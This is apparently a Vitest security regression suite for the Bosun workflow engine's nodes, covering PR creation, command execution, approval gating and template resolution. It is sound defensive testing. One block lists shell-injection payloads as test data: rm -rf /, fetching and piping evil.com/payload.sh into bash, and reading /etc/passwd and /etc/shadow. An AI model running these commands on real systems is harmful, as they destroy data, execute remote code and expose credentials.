/**
 * workflow-nodes-security.test.mjs - Security regression tests for workflow nodes.
 *
 * Verifies:
 *  1. `action.create_pr` schema has both `base` and `branch` properties defined
 *     for backward-compatible workflow payloads.
 *  2. Node type registrations are well-formed and don't expose shell injection
 *     vectors through dynamic payload interpolation.
 *  3. The `create_pr` handler resolves `base` (not `branch`) as the base branch
 *     in Bosun lifecycle handoff payloads.
 *  4. Dangerous shell meta-characters in node config are treated as plain data
 *     and never routed into direct PR creation commands.
 */

import { describe, it, expect, vi } from "vitest";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { execSync } from "node:child_process";
import { getNodeType } from "../workflow/workflow-nodes.mjs";
import { getApprovalRequest, resolveApprovalRequest } from "../workflow/approval-queue.mjs";
import { WorkflowContext } from "../workflow/workflow-engine.mjs";

// -- Helpers ------------------------------------------------------------------

function makeCtx(data = {}) {
  const ctx = new WorkflowContext(data);
  ctx.log = vi.fn();
  return ctx;
}

function makeNode(type, config = {}, id = "test-node") {
  return { id, type, config };
}

// -- create_pr Schema Integrity ------------------------------------------------

describe("action.create_pr schema integrity", () => {
  it("is registered as a node type", () => {
    const nodeType = getNodeType("action.create_pr");
    expect(nodeType).toBeDefined();
  });

  it("schema defines a 'base' property for the base branch", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("base");
    expect(props.base.type).toBe("string");
  });

  it("schema defines a 'branch' property for the head branch", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("branch");
    expect(props.branch.type).toBe("string");
  });

  it("schema also accepts 'baseBranch' as a legacy alias", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("baseBranch");
  });

  it("schema accepts 'repoSlug' for GitHub-hosted mirror worktrees", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("repoSlug");
    expect(props.repoSlug.type).toBe("string");
  });

  it("schema accepts auto-merge configuration", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("enableAutoMerge");
    expect(props).toHaveProperty("autoMergeMethod");
    expect(props.autoMergeMethod.enum).toEqual(["merge", "squash", "rebase"]);
  });
  it("schema requires 'title' but not 'base' or 'branch'", () => {
    const nodeType = getNodeType("action.create_pr");
    const required = nodeType.schema?.required ?? [];
    expect(required).toContain("title");
    expect(required).not.toContain("base");
    expect(required).not.toContain("branch");
  });

  it("has a describe() function returning a non-empty string", () => {
    const nodeType = getNodeType("action.create_pr");
    const desc = nodeType.describe();
    expect(typeof desc).toBe("string");
    expect(desc.length).toBeGreaterThan(0);
  });
});

// -- create_pr Base-Branch Resolution -----------------------------------------

describe("action.create_pr base-branch resolution logic", () => {
  const fastFailCwd = "C:/__bosun_nonexistent__/pr-test";

  it("uses 'base' config field as the PR base branch", async () => {
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      base: "develop",
      baseBranch: "should-not-use-this",
      branch: "feat/add-thing",
      cwd: fastFailCwd,
    });
    const nodeType = getNodeType("action.create_pr");
    const result = await nodeType.execute(node, makeCtx());
    expect(result.base).toBe("develop");
  }, 15000);

  it("falls back to 'baseBranch' when 'base' is absent", async () => {
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      baseBranch: "release",
      branch: "feat/add-thing",
      cwd: fastFailCwd,
    });
    const nodeType = getNodeType("action.create_pr");
    const result = await nodeType.execute(node, makeCtx());
    expect(result.base).toBe("release");
  });

  it("falls back to 'main' when neither base nor baseBranch is set", async () => {
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      branch: "feat/add-thing",
      cwd: fastFailCwd,
    });
    const nodeType = getNodeType("action.create_pr");
    const result = await nodeType.execute(node, makeCtx());
    expect(result.base).toBe("main");
  }, 15000);

  it("normalizes remote-qualified base branches before gh PR calls", async () => {
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      base: "origin/main",
      branch: "feat/add-thing",
      cwd: fastFailCwd,
    });
    const nodeType = getNodeType("action.create_pr");
    const result = await nodeType.execute(node, makeCtx());
    expect(result.base).toBe("main");
  });

  it("rejects invalid repoSlug values before any gh invocation", async () => {
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      base: "main",
      branch: "feat/add-thing",
      repoSlug: "not-a-valid-slug",
      cwd: fastFailCwd,
    });
    const result = await getNodeType("action.create_pr").execute(node, makeCtx());
    expect(result.success).toBe(false);
    expect(result.blocked).toBe(true);
    expect(result.reason).toBe("invalid_repo_slug");
    expect(result.blocking).toEqual(expect.objectContaining({
      field: "repoSlug",
      retryable: false,
    }));
  });

  it("rejects unresolved placeholder branch names before any gh invocation", async () => {
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      base: "main",
      branch: "fix/dep-audit-{{_runId}}",
      cwd: fastFailCwd,
    });
    const result = await getNodeType("action.create_pr").execute(node, makeCtx());
    expect(result.success).toBe(false);
    expect(result.blocked).toBe(true);
    expect(result.reason).toBe("unresolved_branch_placeholder");
    expect(result.blocking).toEqual(expect.objectContaining({
      field: "branch",
      retryable: false,
    }));
  });

  it("blocks PR creation when the workflow recorded no new commits", async () => {
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      base: "main",
      branch: "feat/add-thing",
      cwd: fastFailCwd,
    });
    const result = await getNodeType("action.create_pr").execute(node, makeCtx({
      _hasNewCommits: false,
    }));
    expect(result.success).toBe(false);
    expect(result.blocked).toBe(true);
    expect(result.reason).toBe("no_new_commits");
    expect(result.blocking).toEqual(expect.objectContaining({
      field: "commits",
      retryable: false,
    }));
  });

  it("waits for operator approval before creating a PR when risky approvals are enabled", async () => {
    const repoRoot = mkdtempSync(join(tmpdir(), "wf-create-pr-approval-"));
    const previousSetting = process.env.WORKFLOW_RISKY_ACTION_APPROVALS_ENABLED;
    process.env.WORKFLOW_RISKY_ACTION_APPROVALS_ENABLED = "true";
    try {
      const node = makeNode("action.create_pr", {
        title: "feat: approval gated",
        branch: "feat/approval-gated",
        cwd: fastFailCwd,
      });
      const ctx = makeCtx({
        repoRoot,
        _dagState: { runId: "run-risky-pr", workflowId: "wf-risky" },
        _workflowId: "wf-risky",
        _workflowName: "Risky Approval Workflow",
      });
      const engine = {
        _checkpointRun: vi.fn(() => {
          const requestId = Object.keys(ctx.data._pendingApprovalRequests || {})[0];
          if (requestId) {
            resolveApprovalRequest(requestId, {
              repoRoot,
              decision: "approved",
              actorId: "test-operator",
              note: "approved in test",
            });
          }
        }),
      };

      const result = await getNodeType("action.create_pr").execute(node, ctx, engine);
      const request = getApprovalRequest("workflow-action", "run-risky-pr:test-node", { repoRoot });

      expect(engine._checkpointRun).toHaveBeenCalled();
      expect(request?.status).toBe("approved");
      expect(request?.action?.label).toBe("Create pull request");
      expect(result.success).toBe(true);
      expect(result.handedOff).toBe(true);
      expect(ctx.data._pendingApprovalRequests).toEqual({});
    } finally {
      if (previousSetting === undefined) delete process.env.WORKFLOW_RISKY_ACTION_APPROVALS_ENABLED;
      else process.env.WORKFLOW_RISKY_ACTION_APPROVALS_ENABLED = previousSetting;
      try {
        rmSync(repoRoot, { recursive: true, force: true });
      } catch {
        // Windows can briefly retain handles on the approval queue file after the assertion path.
      }
    }
  });
});

// -- Node Registration Completeness -------------------------------------------

describe("critical node types are registered", () => {
  const requiredNodeTypes = [
    "action.run_agent",
    "action.run_command",
    "action.create_pr",
    "action.create_task",
    "action.update_task_status",
    "action.git_operations",
    "condition.expression",
    "condition.switch",
    "trigger.manual",
    "trigger.schedule",
    "trigger.task_assigned",
  ];

  for (const nodeType of requiredNodeTypes) {
    it(`node type "${nodeType}" is registered`, () => {
      expect(getNodeType(nodeType)).toBeDefined();
    });

    it(`node type "${nodeType}" has an execute function`, () => {
      const nt = getNodeType(nodeType);
      expect(typeof nt.execute).toBe("function");
    });

    it(`node type "${nodeType}" has a valid schema with properties`, () => {
      const nt = getNodeType(nodeType);
      expect(nt.schema).toBeDefined();
      expect(typeof nt.schema).toBe("object");
    });
  }
});

describe("action.create_task adapter contract", () => {
  it("passes projectId separately for two-argument kanban adapters", async () => {
    const nodeType = getNodeType("action.create_task");
    const createTask = vi.fn(async function createTaskAdapter(projectId, taskData) {
      if (projectId && taskData) {
        return { id: "task-42" };
      }
      return { id: "task-fallback" };
    });
    const node = makeNode("action.create_task", {
      title: "[m] fix(workflow): create task contract",
      description: "Ensure compatibility",
      status: "todo",
      projectId: "proj-42",
    });

    const result = await nodeType.execute(node, makeCtx(), {
      services: {
        kanban: {
          createTask,
        },
      },
    });

    expect(result.success).toBe(true);
    expect(result.taskId).toBe("task-42");
    expect(createTask).toHaveBeenCalledWith("proj-42", expect.objectContaining({
      title: "[m] fix(workflow): create task contract",
      description: "Ensure compatibility",
      status: "todo",
      priority: undefined,
      tags: undefined,
      meta: expect.objectContaining({
        workflow: expect.objectContaining({
          runId: expect.any(String),
          sourceNodeId: "test-node",
          sourceNodeType: "action.create_task",
        }),
      }),
    }));
  });
});

// -- Dangerous Payload Containment ---------------------------------------------

describe("dangerous shell payload containment", () => {
  const dangerousInputs = [
    "; rm -rf /",
    "$(curl evil.com)",
    "| cat /etc/passwd",
    "&& wget http://evil.com/payload.sh | bash",
    "`id`",
    "${IFS}cat${IFS}/etc/shadow",
  ];

  it("action.create_pr safely quotes inputs to prevent shell injection", () => {
    const nodeType = getNodeType("action.create_pr");
    const executeSrc = nodeType.execute.toString();
    // The implementation must use JSON.stringify for title/body to prevent
    // shell metacharacter injection into the gh CLI command.
    expect(executeSrc).toContain("JSON.stringify(title)");
    expect(executeSrc).toContain("JSON.stringify(String(body))");
  });

  it("action.create_pr passes repoSlug through gh commands when available", () => {
    const nodeType = getNodeType("action.create_pr");
    const executeSrc = nodeType.execute.toString();
    expect(executeSrc).toContain("repoSlug");
    expect(executeSrc).toContain("args.push(\"--repo\", repoSlug)");
    expect(executeSrc).toContain("existingArgs.push(\"--repo\", repoSlug)");
    expect(executeSrc).toContain("invalid_repo_slug");
    expect(executeSrc).toContain("unresolved_branch_placeholder");
    expect(executeSrc).toContain("no_new_commits");
  });

  it("action.run_command schema does not silently accept untrusted commands", () => {
    // action.run_command intentionally accepts a freeform shell command string -
    // this is by design. What matters is that the schema documents this and
    // requires explicit configuration by the workflow author.
    const nodeType = getNodeType("action.run_command");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("command");
    expect(props.command.type).toBe("string");
    // The schema must NOT mark 'command' as having a default value - it must
    // be explicitly provided by the workflow author
    expect(props.command.default).toBeUndefined();
  });

  it("dangerous input strings are contained — either rejected or safely handed off", async () => {
    const nodeType = getNodeType("action.create_pr");
    for (const input of dangerousInputs) {
      const node = makeNode("action.create_pr", {
        title: input,
        body: input,
        branch: "feat/safety-test",
        // failOnError=false (default) — gh failure gracefully falls back
      });
      const result = await nodeType.execute(node, makeCtx());
      expect(result.success).toBe(true);
      // Whether gh succeeds or falls back, the title/body must be
      // preserved exactly as-is (no shell interpretation occurred).
      expect(result.title).toBe(input);
      // If gh CLI failed/unavailable, it falls back to handoff
      if (result.handedOff) {
        expect(result.lifecycle).toBe("bosun_managed");
      }
    }
  }, 30_000);

  it("action.create_pr adds Bosun provenance labels by default", async () => {
    const nodeType = getNodeType("action.create_pr");
    const node = makeNode("action.create_pr", {
      title: "Label test",
      body: "Label test body",
      branch: "feat/label-test",
      labels: ["custom-label"],
    });

    const result = await nodeType.execute(node, makeCtx());
    expect(Array.isArray(result.labels)).toBe(true);
    expect(result.labels).toContain("custom-label");
    expect(result.labels).toContain("bosun-attached");
    expect(result.labels).toContain("bosun-pr-bosun-created");
    expect(result.createdByBosun).toBe(true);
    expect(String(result.body || "")).toContain("<!-- bosun-created -->");
    expect(String(result.body || "")).toContain("Bosun-Origin: created");
    expect(result.autoMerge?.enabled).toBe(false);
  }, 30_000);

  it("returns autoMerge metadata when auto-merge is enabled in test runtime", async () => {
    const nodeType = getNodeType("action.create_pr");
    const node = makeNode("action.create_pr", {
      title: "Auto-merge metadata",
      body: "Auto-merge metadata",
      branch: "feat/auto-merge-metadata",
      enableAutoMerge: true,
      autoMergeMethod: "rebase",
    });

    const result = await nodeType.execute(node, makeCtx());
    expect(result.success).toBe(true);
    expect(result.autoMerge?.enabled).toBe(true);
    expect(result.autoMerge?.attempted).toBe(false);
    expect(result.autoMerge?.reason).toBe("test_runtime_skip");
    expect(result.autoMerge?.method).toBe("rebase");
  }, 30_000);
});

describe("action.run_command env interpolation", () => {
  it("supports argv-style commands and explicit JSON parsing", async () => {
    const nodeType = getNodeType("action.run_command");
    const node = makeNode("action.run_command", {
      command: "node",
      args: ["-e", 'process.stdout.write(JSON.stringify([{ taskId: "t-1" }]))'],
      parseJson: true,
    });

    const result = await nodeType.execute(node, makeCtx());
    expect(result.success).toBe(true);
    expect(result.output).toEqual([{ taskId: "t-1" }]);
  });

  it("parses the final JSON line when commands emit prefixed logs", async () => {
    const nodeType = getNodeType("action.run_command");
    const node = makeNode("action.run_command", {
      command: "node",
      args: ["-e", 'console.log("[kanban] using internal backend"); console.log(JSON.stringify([{ taskId: "t-2" }]));'],
      parseJson: true,
    });

    const result = await nodeType.execute(node, makeCtx());
    expect(result.success).toBe(true);
    expect(result.output).toEqual([{ taskId: "t-2" }]);
  });

  it("runs multiline node -e scripts through stdin without relying on command-line script transport", async () => {
    const nodeType = getNodeType("action.run_command");
    const script = [
      "const payload = {",
      '  tasks: [{ taskId: "t-stdin-1" }],',
      '  note: "stdin transport"',
      "};",
      "console.log(JSON.stringify(payload));",
    ].join("\n");
    const node = makeNode("action.run_command", {
      command: "node",
      args: ["-e", script],
      parseJson: true,
    });

    const result = await nodeType.execute(node, makeCtx());

    expect(result.success).toBe(true);
    expect(result.output).toEqual({
      tasks: [{ taskId: "t-stdin-1" }],
      note: "stdin transport",
    });
  });

  it("resolves template env values before executing commands", async () => {
    const nodeType = getNodeType("action.run_command");
    const node = makeNode("action.run_command", {
      command: 'node -p "process.env.BOSUN_FETCH_AND_CLASSIFY"',
      env: {
        BOSUN_FETCH_AND_CLASSIFY: "{{payload}}",
      },
    });
    const ctx = makeCtx({
      payload: {
        conflicts: [{ n: 241 }, { n: 243 }],
        ciFailures: [{ n: 765 }],
      },
    });

    const result = await nodeType.execute(node, ctx);
    expect(result.success).toBe(true);
    const parsed = JSON.parse(result.output);
    expect(parsed.conflicts).toHaveLength(2);
    expect(parsed.ciFailures).toHaveLength(1);
  });

  it("resolves expression-style env templates using $ctx node outputs", async () => {
    const nodeType = getNodeType("action.run_command");
    const node = makeNode("action.run_command", {
      command: 'node -p "process.env.BOSUN_FETCH_AND_CLASSIFY"',
      env: {
        BOSUN_FETCH_AND_CLASSIFY: "{{$ctx.getNodeOutput('fetch-and-classify')?.output || '{}'}}",
      },
    });
    const ctx = makeCtx();
    ctx.setNodeOutput("fetch-and-classify", {
      output: JSON.stringify({
        conflicts: [{ n: 246 }, { n: 245 }],
        ciFailures: [{ n: 765 }],
      }),
    });

    const result = await nodeType.execute(node, ctx);
    expect(result.success).toBe(true);
    const parsed = JSON.parse(result.output);
    expect(parsed.conflicts).toHaveLength(2);
    expect(parsed.ciFailures).toHaveLength(1);
  }, 15000);

  it("automatically compacts large command output before storing it in workflow context", async () => {
    const nodeType = getNodeType("action.run_command");
    const node = makeNode("action.run_command", {
      command: "node",
      args: [
        "-e",
        "for (let i = 0; i < 260; i += 1) console.log(`noise-${i} ${'x'.repeat(18)}`); console.log('ERROR workflow reducer failed at src/runtime/handler.ts:42');",
      ],
    });

    const result = await nodeType.execute(node, makeCtx());
    expect(result.success).toBe(true);
    expect(result.outputCompacted).toBe(true);
    expect(result.rawOutputChars).toBeGreaterThan(result.compactedOutputChars);
    expect(result.output).toContain("ERROR workflow reducer failed");
    expect(result.output).toContain("bosun --tool-log");
    expect(result.outputDiagnostics?.summary).toBeTruthy();
    expect(result.outputBudgetPolicy).toBeTruthy();
    expect(result.outputContextEnvelope?.meta?.budgetPolicy).toBe(result.outputBudgetPolicy);
    expect(result.outputHint || result.outputSuggestedRerun || result.outputDiagnostics?.summary).toBeTruthy();
    expect(Array.isArray(result.items)).toBe(true);
    expect(result.items.length).toBe(1);
  });

  it("resolves auto quality-gate commands before execution", async () => {
    const repoRoot = mkdtempSync(join(tmpdir(), "wf-auto-quality-gate-"));
    try {
      writeFileSync(join(repoRoot, "package.json"), JSON.stringify({
        name: "wf-auto-quality-gate",
        version: "1.0.0",
        scripts: {
          "prepush:check": "node -e \"process.stdout.write('quality gate ok')\"",
        },
      }, null, 2));

      const nodeType = getNodeType("action.run_command");
      const node = makeNode("action.run_command", {
        command: "auto",
        commandType: "qualityGate",
        cwd: repoRoot,
      });

      const result = await nodeType.execute(node, makeCtx({ worktreePath: repoRoot }));
      expect(result.success).toBe(true);
      expect(String(result.output)).toContain("quality gate ok");
    } finally {
      rmSync(repoRoot, { recursive: true, force: true });
    }
  }, 30000);

  it("supplies synthetic pre-push stdin when invoking the repo hook directly", async () => {
    const repoRoot = mkdtempSync(join(tmpdir(), "wf-prepush-hook-"));
    try {
      execSync("git init", { cwd: repoRoot, stdio: "pipe" });
      execSync("git config user.email bosun@example.com", { cwd: repoRoot, stdio: "pipe" });
      execSync("git config user.name Bosun", { cwd: repoRoot, stdio: "pipe" });
      execSync("git branch -M main", { cwd: repoRoot, stdio: "pipe" });
      execSync("git remote add origin https://example.com/virtengine/bosun.git", { cwd: repoRoot, stdio: "pipe" });

      mkdirSync(join(repoRoot, ".githooks"), { recursive: true });
      writeFileSync(join(repoRoot, ".githooks", "pre-push"), [
        "#!/usr/bin/env bash",
        "set -euo pipefail",
        "cat > .hook-input.txt",
        "printf '%s\\n' \"$@\" > .hook-args.txt",
        "echo hook ok",
        "",
      ].join("\n"));
      writeFileSync(join(repoRoot, "tracked.txt"), "base\n");
      execSync("git add .githooks/pre-push tracked.txt", { cwd: repoRoot, stdio: "pipe" });
      execSync("git commit -m base", { cwd: repoRoot, stdio: "pipe" });
      execSync("git checkout -b task/test", { cwd: repoRoot, stdio: "pipe" });
      writeFileSync(join(repoRoot, "tracked.txt"), "change\n");
      execSync("git add tracked.txt", { cwd: repoRoot, stdio: "pipe" });
      execSync("git commit -m change", { cwd: repoRoot, stdio: "pipe" });

      const nodeType = getNodeType("action.run_command");
      const node = makeNode("action.run_command", {
        command: "bash .githooks/pre-push",
        cwd: repoRoot,
      }, "quality-gate-hook");

      const result = await nodeType.execute(node, makeCtx({
        worktreePath: repoRoot,
        repoRoot,
        branch: "task/test",
      }));

      expect(result.success).toBe(true);
      expect(String(result.output)).toContain("hook ok");

      const hookInput = readFileSync(join(repoRoot, ".hook-input.txt"), "utf8").trim();
      const [localRef, localSha, remoteRef, remoteSha] = hookInput.split(/\s+/);
      expect(localRef).toBe("refs/heads/task/test");
      expect(localSha).toMatch(/^[a-f0-9]{40}$/);
      expect(remoteRef).toBe("refs/heads/task/test");
      expect(remoteSha).toBe("0000000000000000000000000000000000000000");
    } finally {
      rmSync(repoRoot, { recursive: true, force: true });
    }
  }, 30000);
});

describe("workflow validation output compaction", () => {
  it("compacts noisy failed test output automatically", async () => {
    const nodeType = getNodeType("validation.tests");
    const node = makeNode("validation.tests", {
      command:
        "node -e \"for (let i = 0; i < 220; i += 1) console.log('ok helper-' + i + ' ' + 'x'.repeat(16)); console.log('FAIL tests/runtime/example.test.ts'); console.log('Error: expected true to be false'); process.exit(1);\"",
    });

    const result = await nodeType.execute(node, makeCtx());
    expect(result.passed).toBe(false);
    expect(result.outputCompacted).toBe(true);
    expect(result.output).toContain("FAIL tests/runtime/example.test.ts");
    expect(result.output).toContain("expected true to be false");
    expect(result.output).toContain("bosun --tool-log");
    expect(result.outputBudgetPolicy).toBeTruthy();
    expect(result.outputContextEnvelope?.meta?.family).toBe("test");
    expect(
      result.outputDiagnostics?.suggestedRerun
      || result.outputSuggestedRerun
      || result.outputDiagnostics?.summary,
    ).toBeTruthy();
  });
});

// -- action.git_operations Safety ----------------------------------------------

describe("action.git_operations schema safety", () => {
  it("is registered and has an operations enum", () => {
    const nodeType = getNodeType("action.git_operations");
    expect(nodeType).toBeDefined();
    const props = nodeType.schema?.properties ?? {};
    // Should have an 'operation' property with enum values
    expect(props).toHaveProperty("operation");
  });

  it("supported operations list is an array of strings", () => {
    const nodeType = getNodeType("action.git_operations");
    const props = nodeType.schema?.properties ?? {};
    const opEnum = props.operation?.enum;
    expect(Array.isArray(opEnum)).toBe(true);
    expect(opEnum.every((v) => typeof v === "string")).toBe(true);
  });

  it("supports common safe git operations", () => {
    const nodeType = getNodeType("action.git_operations");
    const props = nodeType.schema?.properties ?? {};
    const opEnum = props.operation?.enum ?? [];
    for (const op of ["commit", "push", "checkout"]) {
      expect(opEnum, `operation "${op}" should be in the allowed enum`).toContain(op);
    }
  });
});

// -- WorkflowContext resolve() does not evaluate shell in template expressions -

describe("WorkflowContext template resolution is not a shell evaluator", () => {
  it("resolves simple mustache variables without executing shell commands", () => {
    const ctx = makeCtx({ name: "alice" });
    const result = ctx.resolve("Hello {{name}}");
    expect(result).toBe("Hello alice");
  });

  it("leaves shell metacharacters intact without execution", () => {
    const ctx = makeCtx({ cmd: "$(whoami)" });
    const result = ctx.resolve("Injected: {{cmd}}");
    expect(result).toBe("Injected: $(whoami)");
    // No actual command execution should have happened
  });

  it("resolves missing variables to empty string, not to the variable name", () => {
    const ctx = makeCtx({});
    const result = ctx.resolve("{{unknown_var}}");
    // Must not execute shell - result is empty or the original token
    expect(typeof result).toBe("string");
    // Critical: must not return a non-string value (e.g. process object)
    expect(result).not.toBeNull();
  });
});

describe("validation nodes can offload to isolated runners", () => {
  it("uses the isolated runner for heavyweight test validation", async () => {
    const nodeType = getNodeType("validation.tests");
    const node = makeNode("validation.tests", { command: "npm test" }, "validate-tests");
    const ctx = makeCtx();
    const runner = vi.fn().mockResolvedValue({
      status: "success",
      stdout: "PASS tests/example.test.mjs\n",
      stderr: "",
      exitCode: 0,
      duration: 25,
      provider: "process",
      leaseId: "runner-1",
      artifactRoot: "C:/tmp/artifacts/runner-1",
      artifacts: [
        {
          label: "stdout",
          path: "C:/tmp/artifacts/runner-1/stdout.log",
          retrieveCommand: 'Get-Content -Raw "C:/tmp/artifacts/runner-1/stdout.log"',
        },
      ],
    });
    const engine = {
      services: {
        scheduler: {
          selectWorkflowLane: vi.fn().mockReturnValue({
            lane: "isolated",
            reason: "workflow_node:validation.tests",
            heavy: true,
          }),
        },
        isolatedRunner: { run: runner },
      },
    };

    const result = await nodeType.execute(node, ctx, engine);

    expect(runner).toHaveBeenCalled();
    expect(result.passed).toBe(true);
    expect(result.isolatedRunner?.leaseId).toBe("runner-1");
    expect(result.artifactRetrieveCommands).toEqual([
      'Get-Content -Raw "C:/tmp/artifacts/runner-1/stdout.log"',
    ]);
  });

  it("surfaces blocked evidence when the isolated runner cannot obtain a lease", async () => {
    const nodeType = getNodeType("validation.build");
    const node = makeNode("validation.build", { command: "npm run build" }, "validate-build");
    const ctx = makeCtx();
    const engine = {
      services: {
        scheduler: {
          selectWorkflowLane: vi.fn().mockReturnValue({
            lane: "isolated",
            reason: "workflow_node:validation.build",
            heavy: true,
          }),
        },
        isolatedRunner: {
          run: vi.fn().mockResolvedValue({
            status: "blocked",
            blocked: true,
            error: "lease_capacity_reached:1",
            exitCode: null,
            provider: "process",
            leaseId: "blocked-1",
            artifactRoot: "C:/tmp/artifacts/blocked-1",
            artifacts: [
              {
                label: "metadata",
                path: "C:/tmp/artifacts/blocked-1/metadata.json",
                retrieveCommand: 'Get-Content -Raw "C:/tmp/artifacts/blocked-1/metadata.json"',
              },
            ],
          }),
        },
      },
    };

    const result = await nodeType.execute(node, ctx, engine);

    expect(result.passed).toBe(false);
    expect(result.blocked).toBe(true);
    expect(result.isolatedRunner?.artifacts).toHaveLength(1);
  });

  it("surfaces timeout diagnostics for isolated validation failures", async () => {
    const nodeType = getNodeType("validation.tests");
    const node = makeNode("validation.tests", { command: "npm test" }, "validate-timeout");
    const ctx = makeCtx();
    const engine = {
      services: {
        scheduler: {
          selectWorkflowLane: vi.fn().mockReturnValue({
            lane: "isolated",
            reason: "workflow_node:validation.tests",
            heavy: true,
          }),
        },
        isolatedRunner: {
          run: vi.fn().mockResolvedValue({
            status: "timeout",
            stdout: "",
            stderr: "validation exceeded limit",
            exitCode: null,
            duration: 120001,
            provider: "process",
            leaseId: "runner-timeout",
            failureDiagnostic: {
              category: "timeout",
              retryable: true,
              summary: "Validation timed out after 120000ms.",
              status: "timeout",
            },
          }),
        },
      },
    };

    const result = await nodeType.execute(node, ctx, engine);

    expect(result.passed).toBe(false);
    expect(result.failureKind).toBe("timeout");
    expect(result.retryable).toBe(true);
    expect(result.failureDiagnostic?.summary).toContain("timed out");
    expect(result.isolatedRunner?.failureDiagnostic?.category).toBe("timeout");
  });

  it("surfaces command failure diagnostics for isolated validation exits", async () => {
    const nodeType = getNodeType("validation.lint");
    const node = makeNode("validation.lint", { command: "npm run lint" }, "validate-lint");
    const ctx = makeCtx();
    const engine = {
      services: {
        scheduler: {
          selectWorkflowLane: vi.fn().mockReturnValue({
            lane: "isolated",
            reason: "workflow_node:validation.lint",
            heavy: true,
          }),
        },
        isolatedRunner: {
          run: vi.fn().mockResolvedValue({
            status: "error",
            stdout: "",
            stderr: "ESLint found 3 errors",
            exitCode: 1,
            duration: 52,
            provider: "process",
            leaseId: "runner-lint",
            failureDiagnostic: {
              category: "command_failure",
              retryable: false,
              summary: "Validation command exited with code 1.",
              status: "error",
              exitCode: 1,
            },
          }),
        },
      },
    };

    const result = await nodeType.execute(node, ctx, engine);

    expect(result.passed).toBe(false);
    expect(result.failureKind).toBe("command_failure");
    expect(result.retryable).toBe(false);
    expect(result.failureDiagnostic?.exitCode).toBe(1);
  });
});
